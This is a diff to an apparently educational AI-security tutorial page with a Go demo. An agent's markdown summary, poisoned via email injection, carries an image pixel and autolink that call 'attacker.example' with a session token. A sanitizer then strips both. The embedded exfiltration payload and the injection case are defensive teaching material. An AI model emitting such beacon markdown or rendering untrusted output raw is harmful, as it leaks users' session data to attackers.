@@ -20,9 +20,114 @@ cd posts/05.3-the-tracking-pixel
 go run .
 ```
 
+The whole program is on this page, in the order it runs, so you can type it in instead of cloning. Make an empty folder, run `go mod init pixel`, then `go get github.com/t0ul/emaildrop@` followed by the version on the first `require` line below, and put the code in one file called `main.go`:
+
+<!-- listing: go.mod#all -->
+```
+module github.com/t0ul/ai-security-engineering/posts/05.3-the-tracking-pixel
+
+go 1.27.1
+
+// The agent's real model-output sanitizer. No overrides.
+require github.com/t0ul/emaildrop v0.0.0-20261011232453-771805568f76
+
+require (
+	github.com/dustin/go-humanize v1.0.1 // indirect
+	github.com/google/uuid v1.6.0 // indirect
+	github.com/mattn/go-isatty v0.0.24 // indirect
+	github.com/ncruces/go-strftime v1.0.0 // indirect
+	github.com/remyoudompheng/bigfft v0.0.0-20230129092748-24d4a6f8daec // indirect
+	github.com/t0ul/gledger v0.0.0-20261006144518-5ac38b514e64 // indirect
+	github.com/t0ul/goflage v0.0.0-20261009135357-739ce25ed7e2 // indirect
+	github.com/t0ul/gonductor v0.0.0-20261006173449-0ff2040c669a // indirect
+	github.com/t0ul/goverlord v0.0.0-20261006151751-a64efb655ae2 // indirect
+	github.com/t0ul/gumpers v0.0.0-20261006154904-836570c2c66c // indirect
+	github.com/t0ul/gustoms v0.0.0-20261007182046-95bfdd23500c // indirect
+	golang.org/x/sys v0.48.0 // indirect
+	modernc.org/libc v1.77.1 // indirect
+	modernc.org/mathutil v1.7.1 // indirect
+	modernc.org/memory v1.12.1 // indirect
+	modernc.org/sqlite v1.60.1 // indirect
+)
+```
+<!-- /listing -->
+
+## The spine of the program
+
+The top of the file holds the attacker's host and the summary the model produced after reading a poisoned email: an ordinary weekly report with a tracking pixel and an auto-fetching link slipped in. `main` hands that summary to the page raw, then sanitized, and checks what the browser would receive each time.
+
+<!-- listing: main.go#head -->
+```go
+// Command main is the runnable demo for lesson 05.3, the tracking pixel.
+//
+// Run it with:
+//
+//	go run .
+//
+// The agent shows the user a summary in a web page, rendered from markdown the
+// model produced. A markdown image in that output is a tracking pixel: the browser
+// fetches it on load, with no click, and its URL can carry data out. This demo
+// hands a poisoned summary to the page as-is and finds the beacon in what the
+// browser would render, then sanitizes the model output first and finds it gone.
+// Deterministic, no model.
+package main
+
+import (
+	"fmt"
+	"os"
+	"strings"
+
+	"github.com/t0ul/emaildrop/pkg/controlplane"
+)
+
+const attackerHost = "attacker.example"
+
+// maliciousOutput is the summary the model produced after reading a poisoned email:
+// a normal report with a tracking pixel and an auto-fetching link smuggled in.
+const maliciousOutput = `# Weekly summary
+
+You are all caught up for this week.
+
+![Data Sync](http://attacker.example/log?d=SESSION-TOKEN-9)
+
+More detail at <http://attacker.example/report>.
+`
+
+func main() {
+	leaked := renderedRaw()
+	blocked := sanitizedFirst()
+
+	fmt.Println()
+	if leaked && blocked {
+		fmt.Println("attack blocked (the receipt): the pixel reaches the browser raw, stripped once the output is sanitized")
+	} else {
+		fmt.Println("a control did not hold")
+		os.Exit(1)
+	}
+}
+```
+<!-- /listing -->
+
 ## I. It fires on page load
 
-Here is the summary the model produced after reading a poisoned email: an ordinary report with a tracking pixel and an auto-fetching link slipped in. Hand it to the page the obvious way, as-is, and look at what the browser receives:
+Hand the summary to the page the obvious way, as-is. The undefended path is one assignment, and the rest of the function is printing what the browser would see:
+
+<!-- listing: main.go#before: hand the model output straight to the page -->
+```go
+// ---- before: hand the model output straight to the page ----
+
+func renderedRaw() bool {
+	fmt.Println("== before: the model output goes straight to the page ==")
+	toBrowser := maliciousOutput
+	fmt.Printf("  the page receives: %s\n", oneLine(firstImageLine(toBrowser)))
+	present := strings.Contains(toBrowser, attackerHost)
+	fmt.Printf("  the beacon host %q reaches the browser: %v (it fetches on page load)\n", attackerHost, present)
+	return present
+}
+```
+<!-- /listing -->
+
+Look at what the browser receives:
 
 ```
 == before: the model output goes straight to the page ==
@@ -36,7 +141,24 @@ That image markdown is the whole attack. Render this summary and the browser see
 
 Model output that a browser will render is active content, and has to be treated like any other untrusted output: scrub out anything that fetches or executes before it reaches the page. The agent's real sanitizer, `controlplane.SanitizeMarkdown`, does exactly that. It finds the ways a URL can auto-fire in markdown, inline images, reference-style images, raw `<img>` tags, autolinks, and `javascript:` or `data:` scheme links, and replaces each with a visible placeholder, returning a count so the removal is on the record. What it defends against is the pixel above: an image the model emitted can never reach the browser, because the renderer is only ever given text the sanitizer has already cleared.
 
-Run the same poisoned summary through it:
+Run the same poisoned summary through it first; the defended path is one call, and the sanitizer reports how many tags it removed:
+
+<!-- listing: main.go#after: sanitize the model output first -->
+```go
+// ---- after: sanitize the model output first ----
+
+func sanitizedFirst() bool {
+	fmt.Println("\n== after: sanitize the model output first ==")
+	clean, removed := controlplane.SanitizeMarkdown(maliciousOutput)
+	fmt.Printf("  the page receives: %s\n", oneLine(firstImageLine(clean)))
+	present := strings.Contains(clean, attackerHost)
+	fmt.Printf("  image/link tags removed: %d; the beacon host reaches the browser: %v\n", removed, present)
+	return !present
+}
+```
+<!-- /listing -->
+
+What the browser receives now:
 
 ```
 == after: sanitize the model output first ==
@@ -45,6 +167,63 @@ Run the same poisoned summary through it:
 ```
 
 The image is gone, replaced by a plain marker the reader can see, the auto-fetching link with it, two removals, and the attacker's host reaches the browser never. The summary still reads fine, "you are all caught up for this week," it just cannot phone home on render.
+
+The two helpers find the image line for printing:
+
+<!-- listing: main.go#helpers -->
+```go
+// ---- helpers ----
+
+func firstImageLine(md string) string {
+	for _, l := range strings.Split(md, "\n") {
+		if strings.Contains(l, "BLOCKED") || strings.Contains(l, "![") || strings.Contains(l, "<http") {
+			return l
+		}
+	}
+	return "(no image)"
+}
+
+func oneLine(s string) string { return strings.TrimSpace(s) }
+```
+<!-- /listing -->
+
+That is the whole program. Its tests assert both halves, and that the real sanitizer reports what it removed and never lets the host through. Put them next to `main.go` as `contract_test.go`:
+
+<!-- listing: contract_test.go#all -->
+```go
+package main
+
+import (
+	"strings"
+	"testing"
+
+	"github.com/t0ul/emaildrop/pkg/controlplane"
+)
+
+// Deterministic, no model. The raw model output carries the tracking pixel to the
+// browser; the agent's real sanitizer strips the image and auto-fetching link from
+// the output, so the beacon host never reaches the page.
+
+func TestPixelRendersRawStrippedBySanitizer(t *testing.T) {
+	if !renderedRaw() {
+		t.Fatal("the raw output should carry the beacon to the browser; otherwise there is nothing to fix")
+	}
+	if !sanitizedFirst() {
+		t.Fatal("SanitizeMarkdown must strip the beacon from the model output")
+	}
+}
+
+func TestSanitizerReportsRemovals(t *testing.T) {
+	clean, removed := controlplane.SanitizeMarkdown(maliciousOutput)
+	if removed < 2 {
+		t.Fatalf("expected the sanitizer to report the image and link it stripped; removed=%d", removed)
+	}
+	if strings.Contains(clean, attackerHost) {
+		t.Fatal("the beacon host survived sanitization")
+	}
+}
+```
+<!-- /listing -->
 
 ## The one principle, two surfaces
 
